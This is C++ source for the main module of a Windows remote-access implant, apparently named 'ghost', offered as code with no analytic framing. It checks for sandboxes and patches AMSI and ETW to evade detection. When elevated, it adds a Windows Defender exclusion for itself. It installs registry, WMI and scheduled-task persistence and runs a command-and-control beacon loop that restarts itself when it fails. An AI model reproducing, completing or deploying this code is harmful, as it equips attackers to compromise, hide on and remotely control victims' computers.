#include <windows.h>
#include <shellapi.h>
#include <algorithm>
#include <stdarg.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// ─── Debug log — pure Win32, no CRT, works from first instruction ─────────────
#ifdef DEBUG
static void DBG(const char* fmt, ...) {
    char buf[512];
    va_list va;
    va_start(va, fmt);
    wvsprintfA(buf, fmt, va);
    va_end(va);
    lstrcatA(buf, "\r\n");
    OutputDebugStringA(buf);
    HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, buf, (DWORD)lstrlenA(buf), &w, NULL);
        CloseHandle(hf);
    }
}
#else
#define DBG(...) do {} while(0)
#endif

static void NtSleep(DWORD ms) {
    typedef NTSTATUS(NTAPI* Fn)(BOOLEAN, PLARGE_INTEGER);
    static Fn pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<Fn>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    DBG("ImplantThread start pid=%lu", GetCurrentProcessId());

#ifndef DEBUG
    if (SandboxCheck()) {
        DBG("sandbox detected");
        DeepSleep();
        return 1;
    }
#endif

    DBG("DecoyLoop");
    DecoyLoop();
    DBG("DecoyLoop done");

    DBG("InitializeSyscalls");
    __try {
        int n = 0;
        while (!InitializeSyscalls()) {
            DBG("InitializeSyscalls fail attempt %d", ++n);
            if (n >= 5) return 1;
            NtSleep(5000);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("InitializeSyscalls EXCEPTION 0x%08X", GetExceptionCode());
        return 1;
    }
    DBG("InitializeSyscalls ok");

    __try { PatchAMSI(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("PatchAMSI EXCEPTION 0x%08X", GetExceptionCode());
    }
    __try { PatchETW(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("PatchETW EXCEPTION 0x%08X", GetExceptionCode());
    }
    __try { ClearHardwareBreakpoints(); } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("ClearHWBP EXCEPTION 0x%08X", GetExceptionCode());
    }
    DBG("evasion done");

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    if (IsElevated()) {
        __try { AddDefenderExclusion(exePath); } __except(EXCEPTION_EXECUTE_HANDLER) {
            DBG("DefenderExclusion EXCEPTION 0x%08X", GetExceptionCode());
        }
    }
    DBG("defender exclusion done, elevated=%d", (int)IsElevated());

    __try {
        InstallRegistryPersistence(exePath);
        if (!IsWmiPersistenceInstalled()) {
            InstallWmiPersistence(exePath);
            InstallWmiScriptPersistence(exePath);
        }
        if (!IsScheduledTaskInstalled()) {
            InstallScheduledTaskPersistence(exePath);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("Persistence EXCEPTION 0x%08X (non-fatal)", GetExceptionCode());
    }
    DBG("persistence done");

    DBG("BeaconLoop start");
    __try {
        BeaconLoop();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        DBG("BeaconLoop EXCEPTION 0x%08X", GetExceptionCode());
        return 1;
    }
    DBG("BeaconLoop returned");
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // ponytail: manifest sets requireAdministrator — Windows handles UAC at launch,
    // no ShellExecuteExW runas needed. Single process, always elevated here.
    DBG("===== WinMain pid=%lu elevated=%d =====",
        GetCurrentProcessId(), (int)IsElevated());

    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) { DBG("kernel32 null"); return 0; }

    auto _CreateThread        = HASHPROC(hK32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hK32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hK32, CloseHandle);
    auto _GetExitCodeThread   = HASHPROC(hK32, GetExitCodeThread);

    DBG("procs CT=%lu WFSO=%lu CH=%lu GECT=%lu",
        (DWORD)(DWORD_PTR)_CreateThread,
        (DWORD)(DWORD_PTR)_WaitForSingleObject,
        (DWORD)(DWORD_PTR)_CloseHandle,
        (DWORD)(DWORD_PTR)_GetExitCodeThread);

    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        DBG("HASHPROC failed");
        return 0;
    }

    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoff = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            DBG("backoff %lums restart#%lu", backoff, restartCount);
            Sleep(backoff);
        }
        DBG("spawning ImplantThread #%lu", restartCount);
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) {
            DBG("CreateThread failed err=%lu", GetLastError());
            Sleep(5000); ++restartCount; continue;
        }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD code = 0;
        _GetExitCodeThread(hThread, &code);
        _CloseHandle(hThread);
        DBG("ImplantThread exit code=%lu", code);
        if (code == 0) { DBG("clean exit"); return 0; }
        ++restartCount;
    }
}
